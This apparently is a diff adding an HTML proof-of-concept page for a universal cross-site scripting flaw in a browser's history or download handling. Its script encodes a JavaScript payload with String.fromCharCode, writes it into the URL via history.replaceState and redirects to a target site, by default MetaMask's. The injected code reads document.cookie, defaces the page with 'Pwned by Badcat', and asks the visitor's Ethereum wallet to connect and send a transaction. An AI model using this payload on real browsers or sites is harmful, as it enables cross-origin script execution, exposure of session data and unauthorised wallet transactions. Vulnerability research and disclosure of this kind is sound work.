@@ -1,0 +1,67 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>History download UXSS bootstrap</title>
+<h1>Preparing history entry…</h1>
+<script>
+  const target =
+    new URLSearchParams(location.search).get('target') ||
+    'https://metamask.io/en-GB';
+
+  const charCodeCall = (value) =>
+    'String.fromCharCode(' +
+    Array.from(value, (character) => character.charCodeAt(0)).join(',') +
+    ')';
+  const jsonExpression = (value) =>
+    'JSON.parse(' + charCodeCall(JSON.stringify(value)) + ')';
+
+  const connectRequest = jsonExpression({
+    method: 'eth_requestAccounts',
+  });
+  const transactionRequest = jsonExpression({
+    method: 'eth_sendTransaction',
+    params: [
+      {
+        from: '',
+        to: '',
+        value: '0x0',
+        data: '0x',
+      },
+    ],
+  });
+  const getterDescriptor = jsonExpression({ get: null, enumerable: true });
+  const selectedAddress = charCodeCall('selectedAddress');
+  const walletRequests =
+    'p=window.ethereum,' +
+    'p&&(' +
+    'c=' + connectRequest + ',' +
+    't=' + transactionRequest + ',' +
+    'g=Reflect.get.bind(null,p,' + selectedAddress + '),' +
+    'd=' + getterDescriptor + ',' +
+    'd.get=g,' +
+    'Object.defineProperty(t.params.at(0),' + charCodeCall('from') + ',d),' +
+    'Object.defineProperty(t.params.at(0),' + charCodeCall('to') + ',d),' +
+    'p.request(c).then(p.request.bind(p,t))' +
+    ')';
+
+  const replacement = '<h1 id="uxss-proof">Pwned by Badcat</h1>';
+  const charCodes = Array.from(replacement, (c) => c.charCodeAt(0)).join(',');
+  const payload =
+    location.origin +
+    "/history/entry'," +
+    'alert(document.domain),' +
+    "document.title='HISTORY_DOWNLOAD_UXSS'," +
+    'document.body.dataset.uxss=location.origin+String.fromCharCode(124)+document.cookie,' +
+    `document.body.innerHTML=String.fromCharCode(${charCodes}),` +
+    walletRequests + ',' +
+    "'/proof.pdf";
+
+ 
+  history.replaceState({ uxss: true }, '', payload);
+
+  
+  addEventListener('load', () => {
+    setTimeout(() => {
+      location.href = target;
+    }, 50);
+  });
+</script>
